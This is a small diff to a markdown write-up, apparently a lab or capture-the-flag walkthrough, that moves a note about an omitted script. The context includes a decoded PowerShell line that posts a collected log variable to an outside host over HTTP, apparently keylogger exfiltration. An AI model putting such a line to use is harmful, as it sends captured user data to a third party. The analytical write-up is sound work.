@@ -62,6 +62,7 @@ Write-Output $dec
 pause
 ```
 Output of the script
+**Note: The guts of this script was left out for the sake of this file's readability. The script will be explored in Task 4**
 
 ```
 $global:log = ""
@@ -70,7 +71,6 @@ $global:log = ""
 ...
 Invoke-WebRequest -uri http://rlwmw.invalid:8080 -Method Post -Body $global:log
 ```
-**Note: The guts of this script was left out for the sake of this file's readability. The script will be explored in Task 4**
 
 ### Finding the POST
 
